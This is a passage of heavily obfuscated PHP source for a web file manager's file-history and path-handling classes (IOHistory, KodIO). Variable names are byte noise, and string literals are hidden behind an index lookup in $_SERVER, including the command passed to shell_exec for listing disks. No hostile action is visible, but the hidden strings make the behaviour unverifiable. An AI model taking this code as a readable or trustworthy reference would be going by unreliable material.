IO::move($ĞÚŠ¨ñ[$“×í»åÆ[1345]], $€ùÔš’ú, !1, $’¢¬¹ñú . $÷ÂŸ‚¬Ê); self::saveData($ĞÚŠ¨ñ[$“×í»åÆ[1345]], $ĞÚŠ¨ñ[$“×í»åÆ[457]]); self::clearEmptyFolder($ĞÚŠ¨ñ[$“×í»åÆ[1344]]); } public static function rollback($ö¼¢®´¾, $Ø‚Ó‚ÑÀ) { $•©½ÎØ =& $_SERVER[‹‰”››ê]; $Ğª‹Êï“ = self::listData($ö¼¢®´¾); if (!$Ğª‹Êï“) { return; } $¥™Ú×Î = IO::info($ö¼¢®´¾); foreach ($Ğª‹Êï“[$•©½ÎØ[457]] as $ïòëÜ«ú => $ÔÏœş÷) { if ($ÔÏœş÷[$•©½ÎØ[487]] == $Ø‚Ó‚ÑÀ) { self::add($ö¼¢®´¾); $ëßµş¬‰ = $Ğª‹Êï“[$•©½ÎØ[1344]] . $ÔÏœş÷[$•©½ÎØ[32]]; $İİ‘´²å = IO::copy($ëßµş¬‰, IO::pathFather($ö¼¢®´¾), REPEAT_REPLACE, $¥™Ú×Î[$•©½ÎØ[32]]); if ($İİ‘´²å) { self::remove($ö¼¢®´¾, $Ø‚Ó‚ÑÀ); } return $İİ‘´²å; } } return !1; } public static function setDetail($ç¶ÓêŠÚ, $³¸¤Í†, $±ƒú†•) { $œ·€‚· =& $_SERVER[‹‰”››ê]; $ï—Ñ‚şÉ = self::listData($ç¶ÓêŠÚ); if (!$ï—Ñ‚şÉ) { return; } foreach ($ï—Ñ‚şÉ[$œ·€‚·[457]] as $˜’ö¤Û => $Úìéìã) { if ($Úìéìã[$œ·€‚·[487]] == $³¸¤Í†) { $ï—Ñ‚şÉ[$œ·€‚·[457]][$˜’ö¤Û][$œ·€‚·[1343]] = $±ƒú†•; self::saveData($ï—Ñ‚şÉ[$œ·€‚·[1345]], $ï—Ñ‚şÉ[$œ·€‚·[457]]); return !0; } } return !1; } public static function fileInfo($˜¿´°Àõ, $ˆšÕúÌÃ) { $³æ×ªç· =& $_SERVER[‹‰”››ê]; $»õ¦î˜¤ = self::listData($˜¿´°Àõ); if (!$»õ¦î˜¤) { show_json(LNG($³æ×ªç·[108]), !1); } $œÀ‘ĞÛ› = $³æ×ªç·[12]; foreach ($»õ¦î˜¤[$³æ×ªç·[457]] as $ñì¶äŠ¨ => $Ğ’°ƒš) { if ($Ğ’°ƒš[$³æ×ªç·[487]] != $ˆšÕúÌÃ) { continue; } $œÀ‘ĞÛ› = $»õ¦î˜¤[$³æ×ªç·[1344]] . $Ğ’°ƒš[$³æ×ªç·[32]]; break; } if (!$œÀ‘ĞÛ›) { show_json(LNG($³æ×ªç·[108]), !1); } return IO::info($œÀ‘ĞÛ›); } public static function fileOut($Ö¼í¸‘Š, $ƒÚÂÍÚ, $¸ú±Å˜¼ = false) { $Ì½Ù˜° =& $_SERVER[‹‰”››ê]; $ì‡Ü§ïÜ = self::fileInfo($Ö¼í¸‘Š, $ƒÚÂÍÚ); $ûû‹°Ô =& $GLOBALS[$Ì½Ù˜°[7]]; $¸ú±Å˜¼ = isset($ûû‹°Ô[$Ì½Ù˜°[1295]]) && $ûû‹°Ô[$Ì½Ù˜°[1295]] == 1; if (isset($ûû‹°Ô[$Ì½Ù˜°[33]]) && $ûû‹°Ô[$Ì½Ù˜°[33]] == $Ì½Ù˜°[1346]) { return IO::fileOutImage($ì‡Ü§ïÜ[$Ì½Ù˜°[87]], $ûû‹°Ô[$Ì½Ù˜°[1347]]); } IO::fileOut($ì‡Ü§ïÜ[$Ì½Ù˜°[87]], $¸ú±Å˜¼, get_path_this($Ö¼í¸‘Š)); } public static function listData($Ë¸çîÈ÷, $è‚™‡ = true) { $Ğ¬—è¿¢ =& $_SERVER[‹‰”››ê]; if ($è‚™‡ && !IO::exist($Ë¸çîÈ÷)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($Ë¸çîÈ÷, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $£âùêñÄ = self::pathHistory($Ë¸çîÈ÷); $‘ïæÛÆê = array($Ğ¬—è¿¢[1345] => $£âùêñÄ . $Ğ¬—è¿¢[1332], $Ğ¬—è¿¢[1344] => rtrim(get_path_father($£âùêñÄ), $Ğ¬—è¿¢[8]) . $Ğ¬—è¿¢[8], $Ğ¬—è¿¢[457] => array()); $íËÙ´ÊÏ = IO::getContent($‘ïæÛÆê[$Ğ¬—è¿¢[1345]]); if ($íËÙ´ÊÏ) { $¥¦€óÑé = json_decode($íËÙ´ÊÏ, !0); if (is_array($¥¦€óÑé)) { $‘ïæÛÆê[$Ğ¬—è¿¢[457]] = $¥¦€óÑé; } } return $‘ïæÛÆê; } private static function saveData($îÎæÁäÁ, $ŸøÑª©) { $œÂªéº =& $_SERVER[‹‰”››ê]; self::log($œÂªéº[1348] . $îÎæÁäÁ . $œÂªéº[74] . count($ŸøÑª©), $œÂªéº[842]); if ($ŸøÑª©) { return IO::setContent($îÎæÁäÁ, json_encode($ŸøÑª©)); } $ª—ñ‰ƒ = IO::pathFather($îÎæÁäÁ); IO::remove($îÎæÁäÁ); self::clearEmptyFolder($ª—ñ‰ƒ); return !0; } public static function clearEmptyFolder($¨ ­°…Ü) { $¦¸–æï¥ =& $_SERVER[‹‰”››ê]; if (trim($¨ ­°…Ü, $¦¸–æï¥[8]) == trim(self::$_historyBase, $¦¸–æï¥[8])) { return; } $Àó…ËáÙ = IO::pathFather($¨ ­°…Ü); $§„ö¿ıİ = IO::has($¨ ­°…Ü, !0); if ($§„ö¿ıİ[$¦¸–æï¥[242]] > 0 || $§„ö¿ıİ[$¦¸–æï¥[243]] > 0) { return; } IO::remove($¨ ­°…Ü); self::clearEmptyFolder($Àó…ËáÙ); } private static function getBasePath() { $Ï¥«§¦€ =& $_SERVER[‹‰”››ê]; $£ë¿“ ó = Model($Ï¥«§¦€[1349])->get($Ï¥«§¦€[1350]); if ($£ë¿“ ó) { if (!IO::exist($£ë¿“ ó)) { IO::mkdir($£ë¿“ ó); } if (get_path_this($£ë¿“ ó) == $Ï¥«§¦€[1335]) { $‰™ÈşÜå = $Ï¥«§¦€[1351] . rand_string(8); @rename($£ë¿“ ó, get_path_father($£ë¿“ ó) . $Ï¥«§¦€[8] . $‰™ÈşÜå); $£ë¿“ ó = DATA_PATH . $‰™ÈşÜå . $Ï¥«§¦€[8]; file_put_contents(DATA_PATH . $Ï¥«§¦€[1282], $Ï¥«§¦€[12]); Model($Ï¥«§¦€[1349])->set($Ï¥«§¦€[1350], $£ë¿“ ó); } return $£ë¿“ ó; } $£ë¿“ ó = DATA_PATH . $Ï¥«§¦€[1351] . rand_string(8) . $Ï¥«§¦€[8]; $£ë¿“ ó = IO::mkdir($£ë¿“ ó); $£ë¿“ ó = rtrim($£ë¿“ ó, $Ï¥«§¦€[8]) . $Ï¥«§¦€[8]; file_put_contents($£ë¿“ ó . $Ï¥«§¦€[1282], $Ï¥«§¦€[12]); file_put_contents(DATA_PATH . $Ï¥«§¦€[1282], $Ï¥«§¦€[12]); Model($Ï¥«§¦€[1349])->set($Ï¥«§¦€[1350], $£ë¿“ ó); return $£ë¿“ ó; } } class KodIO { const KOD_SOURCE = "\173\163\x6f\x75\x72\x63\145\x7d"; const KOD_USER_RECYCLE = "\x7b\x75\163\145\162\x52\145\x63\171\x63\x6c\145\x7d"; const KOD_USER_FAV = "\173\x75\163\x65\162\106\x61\166\175"; const KOD_USER_FILE_TAG = "\x7b\165\x73\x65\x72\x46\151\154\x65\x54\x61\x67\175"; const KOD_USER_FILE_TYPE = "\x7b\x75\x73\x65\x72\106\x69\154\145\x54\x79\x70\x65\x7d"; const KOD_GROUP_ROOT_SELF = "\x7b\147\x72\x6f\165\160\122\x6f\157\x74\123\145\154\146\175"; const KOD_USER_SHARE = "\173\165\163\x65\162\123\x68\x61\x72\x65\x7d"; const KOD_USER_SHARE_LINK = "\x7b\x75\x73\145\x72\123\150\141\x72\x65\x4c\x69\x6e\153\175"; const KOD_USER_SHARE_TO_ME = "\x7b\x73\x68\141\x72\x65\x54\157\x4d\145\x7d"; const KOD_SHARE_ITEM = "\173\163\150\x61\162\145\111\164\x65\155\175"; const KOD_SHARE_LINK = "\x7b\x73\x68\141\162\x65\111\164\x65\155\114\x69\x6e\x6b\x7d"; const KOD_SEARCH = "\x7b\x73\145\141\x72\x63\x68\175"; const KOD_BLOCK = "\x7b\142\154\x6f\x63\153\175"; const KOD_IO = "\173\151\x6f\x7d"; const KOD_USER_RECENT = "\173\x75\x73\145\162\122\145\156\x63\x65\156\x74\175"; const KOD_USER_DRIVER = "\173\x64\x72\151\166\145\x72\x7d"; public static function typeList() { $À½àİ¢‰ =& $_SERVER[‹‰”››ê]; return array($À½àİ¢‰[1352] => self::KOD_SOURCE, $À½àİ¢‰[1353] => self::KOD_USER_RECYCLE, $À½àİ¢‰[1354] => self::KOD_USER_FAV, $À½àİ¢‰[1355] => self::KOD_USER_FILE_TAG, $À½àİ¢‰[1356] => self::KOD_USER_FILE_TYPE, $À½àİ¢‰[1357] => self::KOD_GROUP_ROOT_SELF, $À½àİ¢‰[1358] => self::KOD_USER_SHARE, $À½àİ¢‰[1359] => self::KOD_USER_SHARE_LINK, $À½àİ¢‰[1360] => self::KOD_USER_SHARE_TO_ME, $À½àİ¢‰[1361] => self::KOD_SHARE_ITEM, $À½àİ¢‰[1362] => self::KOD_SHARE_LINK, $À½àİ¢‰[1363] => self::KOD_SEARCH, $À½àİ¢‰[1364] => self::KOD_BLOCK, $À½àİ¢‰[1365] => self::KOD_IO, $À½àİ¢‰[1366] => self::KOD_USER_RECENT, $À½àİ¢‰[1367] => self::KOD_USER_DRIVER); } public static function parse($‘ªù¤ÔÅ) { $¾ìÙÃ½º =& $_SERVER[‹‰”››ê]; $‘ªù¤ÔÅ = self::clear($‘ªù¤ÔÅ); $İâĞ ú¿ = array_values(self::typeList()); preg_match($¾ìÙÃ½º[1368], $‘ªù¤ÔÅ, $×´ÔÛØ); $Ö¿ş÷‘• = array($¾ìÙÃ½º[508] => !1, $¾ìÙÃ½º[1369] => !1, $¾ìÙÃ½º[505] => !1, $¾ìÙÃ½º[87] => $‘ªù¤ÔÅ, $¾ìÙÃ½º[1267] => !1, $¾ìÙÃ½º[1266] => $¾ìÙÃ½º[12]); if (is_array($×´ÔÛØ) && count($×´ÔÛØ) == 5) { $Ëõâ÷´¢ = $¾ìÙÃ½º[1370] . $×´ÔÛØ[2] . $¾ìÙÃ½º[414]; if (in_array($Ëõâ÷´¢, $İâĞ ú¿)) { $Ö¿ş÷‘•[$¾ìÙÃ½º[1267]] = $×´ÔÛØ[1]; $Ö¿ş÷‘•[$¾ìÙÃ½º[33]] = $Ëõâ÷´¢; $Ö¿ş÷‘•[$¾ìÙÃ½º[1371]] = substr($Ëõâ÷´¢, 1, -1); $Ö¿ş÷‘•[$¾ìÙÃ½º[487]] = $×´ÔÛØ[3]; } $Ö¿ş÷‘•[$¾ìÙÃ½º[1266]] = $×´ÔÛØ[4]; } $ âÓÄ£â = array($¾ìÙÃ½º[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $Ö¿ş÷‘•[$¾ìÙÃ½º[1334]] = in_array($Ö¿ş÷‘•[$¾ìÙÃ½º[33]], $ âÓÄ£â); return $Ö¿ş÷‘•; } public static function isTruePath($äêéñŠ¹) { $ßƒıí„’ =& $_SERVER[‹‰”››ê]; if (substr($äêéñŠ¹, 0, 1) != $ßƒıí„’[1370]) { return !0; } if (strpos($äêéñŠ¹, $ßƒıí„’[495]) === 0) { return !0; } if (strpos($äêéñŠ¹, $ßƒıí„’[1338]) === 0) { return !0; } if (strpos($äêéñŠ¹, $ßƒıí„’[1372]) === 0) { return !0; } if (strpos($äêéñŠ¹, $ßƒıí„’[1373]) === 0) { return !0; } if (strpos($äêéñŠ¹, $ßƒıí„’[1374]) === 0) { return !0; } return !1; } public static function clear($üªÈÓæ) { $àùß¢Ù =& $_SERVER[‹‰”››ê]; $üªÈÓæ = str_replace(array($àùß¢Ù[1172], $àùß¢Ù[288]), $àùß¢Ù[53], $üªÈÓæ); $üªÈÓæ = str_replace($àùß¢Ù[100], $àùß¢Ù[8], $üªÈÓæ); $¬ÍÀ¦õŒ = $àùß¢Ù[1375]; if (substr($üªÈÓæ, 0, 3) == $àùß¢Ù[1376]) { $üªÈÓæ = substr($üªÈÓæ, 3); } while (strstr($üªÈÓæ, $¬ÍÀ¦õŒ)) { $üªÈÓæ = str_replace($¬ÍÀ¦õŒ, $àùß¢Ù[8], $üªÈÓæ); } $üªÈÓæ = preg_replace($àùß¢Ù[1377], $àùß¢Ù[8], $üªÈÓæ); if ($üªÈÓæ == $àùß¢Ù[8]) { return $àùß¢Ù[8]; } $üªÈÓæ = rtrim($üªÈÓæ, $àùß¢Ù[8]); return $üªÈÓæ; } public static function pathTrue($¬¨¹±º) { $¼ô—Î¾ =& $_SERVER[‹‰”››ê]; if (!$¬¨¹±º) { return $¼ô—Î¾[12]; } $¬¨¹±º = str_replace($¼ô—Î¾[257], $¼ô—Î¾[8], str_replace($¼ô—Î¾[1378], $¼ô—Î¾[8], $¬¨¹±º)); $¬¨¹±º = str_replace($¼ô—Î¾[257], $¼ô—Î¾[8], str_replace($¼ô—Î¾[1378], $¼ô—Î¾[8], $¬¨¹±º)); if (!strstr($¬¨¹±º, $¼ô—Î¾[1376])) { return $¬¨¹±º; } $§¨«‡Ğ = explode($¼ô—Î¾[8], $¬¨¹±º); foreach ($§¨«‡Ğ as $÷ä˜ú¹ => $¸“Íëø½) { if ($¸“Íëø½ !== $¼ô—Î¾[1379]) { continue; } for ($ê¾À½İÂ = $÷ä˜ú¹; $ê¾À½İÂ >= 0; $ê¾À½İÂ--) { if ($§¨«‡Ğ[$ê¾À½İÂ] === $¼ô—Î¾[10] || $§¨«‡Ğ[$ê¾À½İÂ] === $¼ô—Î¾[1379] || $§¨«‡Ğ[$ê¾À½İÂ] === -1) { continue; } if ($§¨«‡Ğ[$ê¾À½İÂ] === $¼ô—Î¾[12]) { $§¨«‡Ğ[$÷ä˜ú¹] = -1; break; } $§¨«‡Ğ[$÷ä˜ú¹] = -1; $§¨«‡Ğ[$ê¾À½İÂ] = -1; break; } } $ûĞˆ¸ëù = array(); foreach ($§¨«‡Ğ as $¸“Íëø½) { if ($¸“Íëø½ !== -1) { $ûĞˆ¸ëù[] = $¸“Íëø½; } } $‰Ò´‘¸º = implode($¼ô—Î¾[8], $ûĞˆ¸ëù); if (strpos($‰Ò´‘¸º, $¼ô—Î¾[1380]) === 0) { $‰Ò´‘¸º = $¼ô—Î¾[1376] . substr($‰Ò´‘¸º, strlen($¼ô—Î¾[1380])); } return $‰Ò´‘¸º; } public static function pathUrlClear($¿”Šæë”) { $êË¡¹Æ =& $_SERVER[‹‰”››ê]; if (!$¿”Šæë”) { return $¿”Šæë”; } $¿”Šæë” = rawurldecode($¿”Šæë”); $¿”Šæë” = str_replace($êË¡¹Æ[1378], $êË¡¹Æ[8], $¿”Šæë”); if (strpos($¿”Šæë”, $êË¡¹Æ[76]) > 0) { $¿”Šæë” = substr($¿”Šæë”, 0, strpos($¿”Šæë”, $êË¡¹Æ[76])); } if (strpos($¿”Šæë”, $êË¡¹Æ[1381]) > 0) { $¿”Šæë” = substr($¿”Šæë”, 0, strpos($¿”Šæë”, $êË¡¹Æ[1381])); } return $¿”Šæë”; } public static function sourceID($Ô’¶‡·–) { $¸ìğ¡À =& $_SERVER[‹‰”››ê]; $ßºşùâ¦ = self::parse($Ô’¶‡·–); if ($ßºşùâ¦[$¸ìğ¡À[33]] !== self::KOD_SOURCE) { show_json(LNG($¸ìğ¡À[1382]), !1); } return $ßºşùâ¦[$¸ìğ¡À[487]]; } public static function make($Ú¬À½¨ø) { if (!$Ú¬À½¨ø) { return !1; } return self::makePath(self::KOD_SOURCE, intval($Ú¬À½¨ø)); } public static function makeShare($ÔîÈ¤‰†, $†ªµÆ¡¥) { return self::makePath(self::KOD_SHARE_ITEM, $ÔîÈ¤‰†, $†ªµÆ¡¥); } public static function makeFileTypePath($Í¼°²ú) { return self::makePath(self::KOD_USER_FILE_TYPE, $Í¼°²ú); } public static function makeFileTagPath($ä¡ùãÈ) { return self::makePath(self::KOD_USER_FILE_TAG, $ä¡ùãÈ); } public static function makePath($Á†¶µØˆ, $ÑìË×‘§ = '', $òÎˆŸí¤ = '') { $Â­Ÿ²¤¡ =& $_SERVER[‹‰”››ê]; $áŸ©ÉŠğ = substr($Á†¶µØˆ, 1, -1); $ò€ï¬÷„ = $Â­Ÿ²¤¡[1383] . $áŸ©ÉŠğ . $Â­Ÿ²¤¡[1384] . $ÑìË×‘§ . $Â­Ÿ²¤¡[1385]; $ò€ï¬÷„ = $òÎˆŸí¤ ? $ò€ï¬÷„ . $òÎˆŸí¤ . $Â­Ÿ²¤¡[8] : $ò€ï¬÷„; return $ò€ï¬÷„; } public static function hashPath($û˜Üş¾¹, $³¦ÊìÍ– = false) { $æ¬Ú‡úç =& $_SERVER[‹‰”››ê]; $ã»çîºæ = is_array($û˜Üş¾¹) ? $û˜Üş¾¹ : IO::info($û˜Üş¾¹); $Ê³äÙÜÙ = _get($ã»çîºæ, $æ¬Ú‡úç[1386], $æ¬Ú‡úç[12]); if (!$Ê³äÙÜÙ && isset($ã»çîºæ[$æ¬Ú‡úç[238]])) { $Ê³äÙÜÙ = trim($ã»çîºæ[$æ¬Ú‡úç[238]], $æ¬Ú‡úç[121]); } if ($Ê³äÙÜÙ) { return $Ê³äÙÜÙ; } if (!$Ê³äÙÜÙ && isset($ã»çîºæ[$æ¬Ú‡úç[194]]) && $ã»çîºæ[$æ¬Ú‡úç[194]]) { $ã»çîºæ = IO::info(KodIO::make($ã»çîºæ[$æ¬Ú‡úç[194]])); $Ê³äÙÜÙ = _get($ã»çîºæ, $æ¬Ú‡úç[1386], $æ¬Ú‡úç[12]); } $ö‘øë¬Ô = md5($ã»çîºæ[$æ¬Ú‡úç[87]] . $ã»çîºæ[$æ¬Ú‡úç[79]] . $ã»çîºæ[$æ¬Ú‡úç[88]]); $§¾—İ±Š = $ö‘øë¬Ô . $æ¬Ú‡úç[1387]; $Ê³äÙÜÙ = $Ê³äÙÜÙ ? $Ê³äÙÜÙ : Cache::get($§¾—İ±Š); if (!$Ê³äÙÜÙ && $³¦ÊìÍ–) { $Ê³äÙÜÙ = IO::hashSimple($ã»çîºæ[$æ¬Ú‡úç[87]]); Cache::set($§¾—İ±Š, $Ê³äÙÜÙ ? $Ê³äÙÜÙ : $ö‘øë¬Ô, 3600 * 24 * 30); } return $Ê³äÙÜÙ ? $Ê³äÙÜÙ : $ö‘øë¬Ô; } public static function hashPathSafe($âÛã‡, $ŒÃ¯Ê¢‚ = false) { $¥¦–óØæ =& $_SERVER[‹‰”››ê]; $ß„ù‹ø” = self::hashPath($âÛã‡, $ŒÃ¯Ê¢‚); return md5($ß„ù‹ø” . $¥¦–óØæ[1388] . Model($¥¦–óØæ[860])->get($¥¦–óØæ[861])); } public static function initSystemPath() { $—…®÷õÅ =& $_SERVER[‹‰”››ê]; if (defined($—…®÷õÅ[1389])) { return; } define($—…®÷õÅ[1389], self::systemPath($—…®÷õÅ[192])); define($—…®÷õÅ[1390], self::systemPath($—…®÷õÅ[1391])); define($—…®÷õÅ[1392], self::systemPath($—…®÷õÅ[1393])); define($—…®÷õÅ[1394], self::systemPath($—…®÷õÅ[1395])); IOHistory::bindEvent(); } public static function systemPath($ÚâòÀˆŠ) { $³´üµòš =& $_SERVER[‹‰”››ê]; $Øƒ®Ë¿ = $³´üµòš[1396] . ucfirst($ÚâòÀˆŠ); $¸·ƒıôİ = Model($³´üµòš[860])->get($Øƒ®Ë¿); if ($¸·ƒıôİ) { return $¸·ƒıôİ; } if ($ÚâòÀˆŠ == $³´üµòš[192]) { $¸·ƒıôİ = self::make(Model($³´üµòš[920])->systemRootPathAdd($³´üµòš[622])); } else { $¸·ƒıôİ = self::systemPath($³´üµòš[192]); $ı±¤·å™ = self::sourceID($¸·ƒıôİ); $¸·ƒıôİ = self::make(Model($³´üµòš[920])->mkdir($ı±¤·å™, $ÚâòÀˆŠ)); } Model($³´üµòš[860])->set($Øƒ®Ë¿, $¸·ƒıôİ); return $¸·ƒıôİ; } public static function systemFolder($ñÍ¥Ò½«) { $ùË¾®Ï = IO_PATH_SYSTEM_SOURCE . $ñÍ¥Ò½«; $œ‚äò­ = Cache::get($ùË¾®Ï); if (!$œ‚äò­) { $™ä­½‡Ä = IO::infoFullSimple($ùË¾®Ï); if (!$™ä­½‡Ä) { $œ‚äò­ = IO::mkdir($ùË¾®Ï, REPEAT_SKIP); } else { $œ‚äò­ = $™ä­½‡Ä[$_SERVER[‹‰”››ê][87]]; } Cache::set($ùË¾®Ï, $œ‚äò­, 3600 * 10); } return $œ‚äò­; } public static function defaultDriver() { return Model($_SERVER[‹‰”››ê][857])->defaultDriver(); } public static function defaultIO() { $Ü†×òıİ =& $_SERVER[‹‰”››ê]; $ÃßèöŞ¾ = self::defaultDriver(); return $Ü†×òıİ[1397] . $ÃßèöŞ¾[$Ü†×òıİ[487]] . $Ü†×òıİ[1385]; } public static function defaultDriverInit() { static $˜ÇŞÎ±ß = false; if ($˜ÇŞÎ±ß) { return $˜ÇŞÎ±ß; } $˜ÇŞÎ±ß = IO::init(self::defaultIO()); return $˜ÇŞÎ±ß; } public static function fileTypeList() { $¨ÆĞÒ =& $_SERVER[‹‰”››ê]; $ÑÃ¯³Áú = $GLOBALS[$¨ÆĞÒ[6]][$¨ÆĞÒ[1398]]; foreach ($ÑÃ¯³Áú as $ŒºÍ¯Ü => $”³µùÌã) { $”ïâŒè¶ = $¨ÆĞÒ[1399] . $ŒºÍ¯Ü; $ã¸¶¿Ç£ = LNG($”ïâŒè¶); if ($”ïâŒè¶ != $ã¸¶¿Ç£) { $ÑÃ¯³Áú[$ŒºÍ¯Ü][$¨ÆĞÒ[32]] = $ã¸¶¿Ç£; } } return $ÑÃ¯³Áú; } public static function diskList($ÃôöÔõù = true) { $¢ÌğÑÅ = $_SERVER[‹‰”››ê][1400]; if ($ÃôöÔõù) { $Ù˜ìãÍÜ = Cache::get($¢ÌğÑÅ); if (is_array($Ù˜ìãÍÜ)) { return $Ù˜ìãÍÜ; } } $Ù˜ìãÍÜ = self::diskListGet(); Cache::set($¢ÌğÑÅ, $Ù˜ìãÍÜ, 60); return $Ù˜ìãÍÜ; } public static function diskListGet() { $ş©ôÆ€Ñ =& $_SERVER[‹‰”››ê]; $ïùàÍÍ = array(); if ($GLOBALS[$ş©ôÆ€Ñ[6]][$ş©ôÆ€Ñ[1401]] == $ş©ôÆ€Ñ[1402]) { $ĞƒÄ«¥„ = $ş©ôÆ€Ñ[1403]; for ($îÏ¯ ‘¥ = 0; $îÏ¯ ‘¥ < strlen($ĞƒÄ«¥„); $îÏ¯ ‘¥++) { $´â†õë = $ĞƒÄ«¥„[$îÏ¯ ‘¥] . $ş©ôÆ€Ñ[1404]; if (file_exists($´â†õë)) { $ïùàÍÍ[] = $´â†õë; } } return $ïùàÍÍ; } if (!function_exists($ş©ôÆ€Ñ[101])) { $ïùàÍÍ[] = $ş©ôÆ€Ñ[931]; return $ïùàÍÍ; } $á“‚™ = explode($ş©ôÆ€Ñ[288], shell_exec($ş©ôÆ€Ñ[1405])); array_shift($á“‚™); array_pop($á“‚™); $·ˆİ®üĞ = array($ş©ôÆ€Ñ[1406], $ş©ôÆ€Ñ[1407], $ş©ôÆ€Ñ[1408], $ş©ôÆ€Ñ[1409], $ş©ôÆ€Ñ[1410], $ş©ôÆ€Ñ[1411], $ş©ôÆ€Ñ[1412], $ş©ôÆ€Ñ[1413]); foreach ($á“‚™ as $†¦©¿ÏÂ) { $˜¸Úºò = preg_split($ş©ôÆ€Ñ[1414], $†¦©¿ÏÂ); $´â†õë = $˜¸Úºò[count($˜¸Úºò) - 1]; if (!strstr($˜¸Úºò[0], $ş©ôÆ€Ñ[1415]) || !$´â†õë) { continue; } $ß‚Š´ô = rtrim($´â†õë, $ş©ôÆ€Ñ[8]) . $ş©ôÆ€Ñ[8]; if (in_array($ß‚Š´ô, $·ˆİ®üĞ)) { continue; } $ïùàÍÍ[] = $ß‚Š´ô; } return $ïùàÍÍ; } public static function isSameDisk($‘ôó˜µ, $¶ì°¸») { $ôã±Ÿ· =& $_SERVER[‹‰”››ê]; if ($GLOBALS[$ôã±Ÿ·[6]][$ôã±Ÿ·[1401]] == $ôã±Ÿ·[1402]) { return strtolower(substr($‘ôó˜µ, 0, 1)) == strtolower(substr($¶ì°¸», 0, 1)); } $µÉ Úë­ = stat($‘ôó˜µ); $÷Ä‰ØÇ¹ = stat($¶ì°¸»); if ($µÉ Úë­ === !1 || $÷Ä‰ØÇ¹ === !1) { return !1; } return $µÉ Úë­[$ôã±Ÿ·[1416]] === $÷Ä‰ØÇ¹[$ôã±Ÿ·[1416]]; $øşÇÔâ = self::diskList(); $â½Ù¨×õ = !1; $Š¬Ú»½Ş = !1; sort($øşÇÔâ); $øşÇÔâ = array_reverse($øşÇÔâ); $‘ôó˜µ = rtrim($‘ôó˜µ, $ôã±Ÿ·[8]) . $ôã±Ÿ·[8]; $¶ì°¸» = rtrim($¶ì°¸», $ôã±Ÿ·[8]) . $ôã±Ÿ·[8]; foreach ($øşÇÔâ as $¿òîÅÇæ) { $€Ó™ô—§ = strlen($¿òîÅÇæ); if (!$â½Ù¨×õ && substr($‘ôó˜µ, 0, $€Ó™ô—§) == $¿òîÅÇæ) { $â½Ù¨×õ = $¿òîÅÇæ; } if (!$Š¬Ú»½Ş && substr($¶ì°¸», 0, $€Ó™ô—§) == $¿òîÅÇæ) { $Š¬Ú»½Ş = $¿òîÅÇæ; } if ($â½Ù¨×õ && $Š¬Ú»½Ş) { break; } } return $â½Ù¨×õ === $Š¬Ú»½Ş; } public static function transferType($ï¹°´, $¦üÈü´) { $ãÒÓç§² =& $_SERVER[‹‰”››ê]; $‘ÉøŞ¦š = self::driverType($ï¹°´); $¶ú™ˆêï = self::driverType($¦üÈü´); if ($‘ÉøŞ¦š[$ãÒÓç§²[33]] == $¶ú™ˆêï[$ãÒÓç§²[33]] && $‘ÉøŞ¦š[$ãÒÓç§²[1417]] == $¶ú™ˆêï[$ãÒÓç§²[1417]]) { return $ãÒÓç§²[1418]; } if ($‘ÉøŞ¦š[$ãÒÓç§²[33]] == $ãÒÓç§²[965] && $¶ú™ˆêï[$ãÒÓç§²[33]] == $ãÒÓç§²[109]) { return $ãÒÓç§²[1295]; } if ($‘ÉøŞ¦š[$ãÒÓç§²[33]] == $ãÒÓç§²[109] && $¶ú™ˆêï[$ãÒÓç§²[33]] == $ãÒÓç§²[965]) { return $ãÒÓç§²[110]; } return $ãÒÓç§²[1419]; } public static function driverType($¦«±°¶Ê) { $­¦ª—¶Ø =& $_SERVER[‹‰”››ê]; $ĞâÂº†ş = str_replace($­¦ª—¶Ø[1420], $­¦ª—¶Ø[12], strtolower($¦«±°¶Ê->getType())); if ($ĞâÂº†ş == $­¦ª—¶Ø[847] || $ĞâÂº†ş == $­¦ª—¶Ø[1421] || $ĞâÂº†ş == $­¦ª—¶Ø[1422]) { $¦«±°¶Ê = self::defaultDriverInit(); } else { if ($ĞâÂº†ş == $­¦ª—¶Ø[1305] || $ĞâÂº†ş == $­¦ª—¶Ø[1423]) { $¦«±°¶Ê = IO::init($¦«±°¶Ê->pathParse[$­¦ª—¶Ø[1248]]); } } $áÏÙ—Ğ› = $¦«±°¶Ê->path; $ĞâÂº†ş = str_replace($­¦ª—¶Ø[1420], $­¦ª—¶Ø[12], strtolower($¦«±°¶Ê->getType())); if ($ĞâÂº†ş == $­¦ª—¶Ø[109]) { return array($­¦ª—¶Ø[33] => $­¦ª—¶Ø[109], $­¦ª—¶Ø[1417] => $­¦ª—¶Ø[12], $­¦ª—¶Ø[87] => $áÏÙ—Ğ›, $­¦ª—¶Ø[98] => $¦«±°¶Ê); } return array($­¦ª—¶Ø[33] => $­¦ª—¶Ø[965], $­¦ª—¶Ø[1417] => $¦«±°¶Ê->pathDriver, $­¦ª—¶Ø[87] => $áÏÙ—Ğ›, $­¦ª—¶Ø[98] => $¦«±°¶Ê); } public static function pathDriverType($îÍ¾şâ—) { return $îÍ¾şâ— ? self::driverType(IO::init($îÍ¾şâ—)) : !1; } public static function pathDriverLocal($¦ì¡µ…Ä) { $êÜÃù¦  =& $_SERVER[‹‰”››ê]; $óŸŠô¢ = $¦ì¡µ…Ä ? self::driverType(IO::init($¦ì¡µ…Ä)) : !1; return strtolower($óŸŠô¢[$êÜÃù¦ [33]]) == $êÜÃù¦ [109] ? !0 : !1; } public static function allowCover($Ğ³•‹Ù³, $¸ÙË˜’Î = true) { $ÅËúìÙ¼ =& $_SERVER[‹‰”››ê]; if (is_string($Ğ³•‹Ù³)) { $Ğ³•‹Ù³ = IO::info($Ğ³•‹Ù³); } if (!$Ğ³•‹Ù³ || $Ğ³•‹Ù³[$ÅËúìÙ¼[33]] == $ÅËúìÙ¼[78] || $Ğ³•‹Ù³[$ÅËúìÙ¼[79]] <= 100) { return !1; } if (isset($Ğ³•‹Ù³[$ÅËúìÙ¼[1424]]) || !$Ğ³•‹Ù³[$ÅËúìÙ¼[87]]) { return !1; } if (isset($Ğ³•‹Ù³[$ÅËúìÙ¼[235]]) && !$Ğ³•‹Ù³[$ÅËúìÙ¼[235]]) { return !1; } static $†˜¬Ê¿ã = false; if (!$†˜¬Ê¿ã || !$¸ÙË˜’Î) { $¸²Ã€¸¾ = 